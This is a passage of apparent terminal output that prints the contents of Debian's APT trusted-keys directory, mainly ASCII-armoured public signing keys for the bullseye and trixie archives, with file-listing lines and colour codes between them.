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
TT9yj35WJXkuIZ7GV189g3gogTpu
=Xxba
-----END PGP PUBLIC KEY BLOCK-----
-rw-r--r-- 1 root root 3403 Apr  9  2025 /etc/apt/trusted.gpg.d/debian-archive-bullseye-stable[1;31m.asc[0m
-----BEGIN PGP PUBLIC KEY BLOCK-----
mQINBGAoEk4BEADG6NQ0Ex5gy0OlnGlFZsTpiZV2LiUhACFj6ZHVEYQQNWgEgRnZ
uZeAXbTnFywzrJUYhx51pNjxfoViN/4Jyn2oMrmaBEuDxEwhVZDsMTzb9dx0MNnm
jMr45z/4EGjln07tFzes+J+0eVizJOWehQ40IEwyCZIG9QOfsC1e1estm0KLZKWb
4gTihGFSahM4zeD6XlZ8krTlkWV9i7+oatCkNziuOTf8+ZXEqoNm/dJxG6pGWcal
o+DiTE3l4HCFr6MZoiCoWVaKYn1jtIUeioDVW8zPalt3VcPmjvYb6ZNHhFK8d3DD
V17wv7TFJIOn1j2n82jzbDZwQAWIA6iKPjXDJJqmv4qcZ5a5l8qirhjZhQEemftY
sGBLTjx9ANfPcDFoQ69ojDw34Nchig2nJ+7ut9h5mjeB9QmOx10HDposRaZq8yPC
hFpheHNlKwh9PYba0Z9Vb3mI04ywkw1oGc6YQD/VGhoGiMembzEK110DsCcZenD5
dOWHug5LF7QTH+120eG4Qt0RcPLqI33+3FUOjzOQubw0QATYs8Dw2E36LVOUx1yr
tDqjJs/ZXfr+LCfaZRshvYfcl3soHCXxVqEwoXUmxJK741RS4ej8w79clniZPMLc
68XpFZ7qsKoKBHeoG1l8XvuAp9EpW4vujsehEwRudn1SNoc5fTFG9k8qlQARAQAB
tElEZWJpYW4gU3RhYmxlIFJlbGVhc2UgS2V5ICgxMS9idWxsc2V5ZSkgPGRlYmlh
bi1yZWxlYXNlQGxpc3RzLmRlYmlhbi5vcmc+iQJUBBMBCgA+FiEEpChSlfx7GoFg
AGKpYFxm8A1sl5MFAmAoEk4CGwMFCQ8JnAAFCwkIBwIGFQoJCAsCBBYCAwECHgEC
F4AACgkQYFxm8A1sl5OtbBAAuI9V8uztBX+gZhvI7LYRZkuWzmNa/qiDGHAF6DIA
OYKqCZUDSrkF9qsIkeeZdEP7hLoIo6TkprvF5iLFTfzFWPT1VR9E/itBBzEZa2Vr
gT0ye8gYrsRdNkso2vqZQd3muDJvg9UrT37+Nt0eOpFAfc3JYfqwjhVIngiNLwjG
TC5oinEesdDCgqxo8Z6e6NyMLdDtS4W26q7GxcuG5YcBoYi3pjxJx8ZGsNHqEe6R
vU3YGahEgWWY80xCRarm8RVYgfU4LZfm6D4o1ZO3B2UmK6+TgkTjYWzC/yMrcbK4
lyumB36OCSg8byrJ3qUN7zKKU0DIxPqFFCLxxhYxf4QrMPik0BTgloWntP2VFLUo
3DxJQKAqQULr+H/WEgbsgAuU8U0VLTlj9sCXn0iN0pHzNaEJJ4sz5mdIWOdJJobk
biQT+xAGwfoKDff9l9fu82p569sK9U+omHMuDfxTT0X13U/6d2m5nIFwf1MitshU
8frYxuZs3Lp0Qi1Xsqtwc/wrIDt5c0M4wluypuz//eRLLwsMn6KEl1/Be/RebHSb
FKOA2tdsc/hfABsVQCFpRHgBmpLfL/5Qwd/K7dKKpuh/7pV4B1cNgviKwMFhhR2e
GzTfbXqxytnYmJkV++bKLtX1SkNx1TBb4lqICzdFOV5QjtjPBVZR7Ugx7sp7yZn4
bw2JAjMEEAEIAB0WIQRyA2MOLI5yclFoT+vFzl3CxULNWQUCYCgSfgAKCRDFzl3C
xULNWR3gD/wLYa1UBOMszWu/BTLt42QHcd6onTTboP4S9w1Gs/ak5iQiEN45CVVL
bJ5wS1iaeuMZ85fOtcEvJ9KqMvwvGXlsCD/+O0QJJbEpeJpHarj4ZtxaL659ipci
qeSIQAsAb6/9SKZZ7HGQFD6DAF9kzV9HpKnNvE8BGQ8I38Ez9lfRiQuD16r4cqNg
S076Z1AoQU8ES5N8VO5v1fbAHsyLq9ZToE28BKGU4o59Fj5uqpfDrm0DrnSn053j
UK942IGmIwKtUAn/j2sG9mcow47xjifVTKuMXyNGDM30n6ITRtiTaZsUZGIw/yKM
3ZosuxobxvJoef8B43MpEHYV/xZHYxegT3xlu5h8FlUQrr/WR7FtT7Awlapm6llI
a/2G0nrPhQlX5nN5gJiKO92rOvKM4wTadBjL41jfYZb5EE44T51hCpJUB1g2GSQk
UpYM/MgcNfqmq7+7bAxinej/iCzhziv925mUOhIGhAUEYCZMFI4tIEVFFAUb4pi1
CtXo3V8DJRu5TkuETwDdK+FfBU2e3q7b0q/CTHdHfD8T7VuTaYm01meCqWG8HS3h
2OSgtWrUgDBDKAU3O83KK7n6K+SAXW1iOaUzW9GErZnYqlEOMJVQn1pU+txUAAdT
fQy05mUvCUvHo5VOcC3wybU5HCZJ3cWe6HCOviBheeIysa+iSvBAU4kCMwQQAQoA
HRYhBApVt8USIzlChux0w1OUR53TUkxRBQJgNqemAAoJEFOUR53TUkxRYSUP/Rt9
FTybIXwOW6FE3LPF7GvEWX//loxKRhiBSQ8Fwmkdchz3iJSAcZ8HgcISMH5P77Ip
8U9z8GAucy46Bi7tsaisWOUVxu5gvh6zLui7PkCRubIxcCxA+JjX5oZm3LSy49s1
SEC/o0MB4TRwpqRfuEots6H0Z9eHzvJKjoeX9Ku7SjfSSRWY3TWMMIjQBATRZGcT
mgA3iJ4/9dFmBGsYhQq1WsY7bCmCahemAmAkdCxkB3hr8BA1Dm/GHgL0++txJhjC
FwKj89yh+Or8l/C95qptS2uAxioDM9952DUm65oWtApsFs8VpcJxSdApmWmH4s8/
B/ESPKv7apLq3BSgLy4UA4FdFz+XS9xw3GItcPunzGZQfI6Dd5jPUMwYYqcr1cVB
2vTiQB//smNjWq2skWTKBtjk2xpPOMCKC5mdGI467RT8HpDMcKWUbg1kaPqCCzpQ
9NJQuk+M9+jw78MELtUGVi8wIZSZCjR2zXduenyVUWmQTHSNfS2R3iWsYH6m7fL2
iA9j4Zi7sEjffGbLkQfQqH+c4XBDWNzJnC+/jQeWKG++zcYtEHv0mk37agw2qB9H
QdTO2xGJcfNF+dervAj1O2fvasOMj9aptRZVpKVMs25zbkplBR5mqPXven+SraDO
Qb5fppcPrKPt88G3e+dBuBzElOXBWpIsMJuvutFniHUEEBYIAB0WIQTKYZ1lpyp7
rfyW0oAZZBiq63TIoQUCYDaonAAKCRAZZBiq63TIoR41AQCLcs+WlaZTZ0rg/cWh
vApi12mZpXQC60bxvmrtTyHH4AEA2pJLfGVHOualRCNbeGEYjfC0WiC+EYCC3NBV
e18slw8=
=7Dni
-----END PGP PUBLIC KEY BLOCK-----
-rw-r--r-- 1 root root 11861 Apr  9  2025 /etc/apt/trusted.gpg.d/debian-archive-trixie-automatic[1;31m.asc[0m
-----BEGIN PGP PUBLIC KEY BLOCK-----
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
